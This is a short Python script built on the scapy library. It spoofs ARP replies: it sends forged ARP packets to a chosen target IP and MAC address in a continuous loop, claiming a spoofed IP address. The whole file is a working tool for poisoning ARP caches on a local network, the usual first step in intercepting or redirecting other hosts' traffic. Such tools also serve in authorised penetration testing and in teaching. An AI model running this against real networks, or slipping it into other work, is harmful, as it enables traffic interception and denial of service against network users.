#!/usr/bin/env python3
# Description: Spoof ARP reply
# Depends on:  scapy
#
# (c) 2020 volgk, github.com/volgk
# (c) 2022 Alexandr Savca, alexandr dot savca89 at gmail dot com

from scapy.all import *

def arp_reply_spoof(iface, targetip, targetmac, spoofip, timeout):
    packet = ARP(op=2, pdst=targetip, hwdst=targetmac, psrc=spoofip)
    send(packet, iface=iface, loop=True, inter=timeout, verbose=True)

if __name__ == "__main__":
    import argparse
    import time

    iface = get_working_if()

    parser = argparse.ArgumentParser(add_help=True,
            description="Spoof ARP reply")

    parser.add_argument("-i", "--iface",
            action="store",
            dest="iface",
            help=f"interface name (default is {iface}")

    parser.add_argument("-ti", "--targetip",
            action="store",
            required=True,
            dest="targetip",
            help="target IP address")

    parser.add_argument("-tmac", "--targetmac",
            action="store",
            dest="targetmac",
            help="target MAC address (default is targetip's address)")

    parser.add_argument("-si", "--spoofip",
            action="store",
            dest="spoofip",
            required=True,
            help="spoof IP address")

    parser.add_argument("-T", "--timeout", action="store",
            dest="timeout",
            default=0,
            type=int,
            help="timeout between sending spoof packets (default is 0)")

    args = parser.parse_args()

    if args.iface:
        iface = args.iface

    if args.targetmac:
        targetmac = args.targetmac
    else:
        targetmac = getmacbyip(args.targetip)

    if os.getuid() != 0:
        print("Must be superuser.")
        sys.exit(1)

    arp_reply_spoof(iface, args.targetip, targetmac, args.spoofip,
            args.timeout)


# vim:sw=4:ts=4:sts=4:et:tw=71:cc=72
# End of file.
